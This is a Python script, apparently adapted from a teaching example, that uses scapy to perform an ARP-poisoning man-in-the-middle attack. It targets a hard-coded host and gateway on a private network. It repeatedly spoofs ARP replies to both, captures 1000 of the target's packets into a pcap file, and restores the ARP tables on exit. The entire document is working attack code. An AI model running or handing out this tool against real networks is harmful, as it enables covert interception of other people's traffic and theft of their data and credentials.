#!/usr/bin/python
from scapy.all import *
import os
import sys
import threading
import signal
interface = "eth1"
target = "192.168.108.49"
gateway = "192.168.108.1"
packets = 1000
conf.iface = interface
conf.verb = 0
def restore(gateway, gwmac_addr, target, targetmac_addr):
   print "\nRestoring normal ARP mappings."
   send(ARP(op = 2, psrc = gateway, pdst = target, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gwmac_addr), count = 5)
   send(ARP(op = 2, psrc = target, pdst = gateway, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = targetmac_addr), count = 5)
   sys.exit(0)
def macgrab(ip_addr):
   responses, unanswered = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip_addr), timeout = 2, retry = 10)
   for s,r in responses:
     return r[Ether].src
     return None
def poison_target(gateway, gwmac_addr, target, targetmac_addr):
   poison_target = ARP()
   poison_target.op = 2
   poison_target.psrc = gateway
   poison_target.pdst = target
   poison_target.hwdst = targetmac_addr
   poison_gateway = ARP()
   poison_gateway.op = 2
   poison_gateway.psrc = target
   poison_gateway.pdst = gateway
   poison_gateway.hwdst = gwmac_addr
   print "\nMitM ARP attack started."
   while True:
     try:
       send(poison_target)
       send(poison_gateway)
       time.sleep(2)
     except KeyboardInterrupt:
       restore(gateway, gwmac_addr, target, targetmac_addr)
   return
gwmac_addr = macgrab(gateway)
targetmac_addr = macgrab(target)
if gwmac_addr is None:
   print "\nUnable to retrieve gateway MAC address. Are you connected?"
   sys.exit(0)
else:
   print "\nGateway IP address: %s\nGateway MAC address: %s\n" % (gateway, gwmac_addr)
if targetmac_addr is None:
   print "\nUnable to retrieve target MAC address. Are you connected?"
   sys.exit(0)
else:
   print "\nTarget IP address: %s\nTarget MAC address: %s\n" % (target, targetmac_addr)
mitm_thread = threading.Thread(target = poison_target, args = (gateway, gwmac_addr, target, targetmac_addr))
mitm_thread.start()
try:
   print "\nMitM sniffing started. Total packets to be sniffed: %d" % packets
   bpf = "ip host %s" % target
   cap_packets = sniff(count=packets, filter=bpf, iface=interface)
   wrpcap('arpMITMresults.pcap', cap_packets)
   restore(gateway, gwmac_addr, target, targetmac_addr)
except KeyboardInterrupt:
   restore(gateway, gwmac_addr, target, targetmac_addr)
   sys.exit(0)
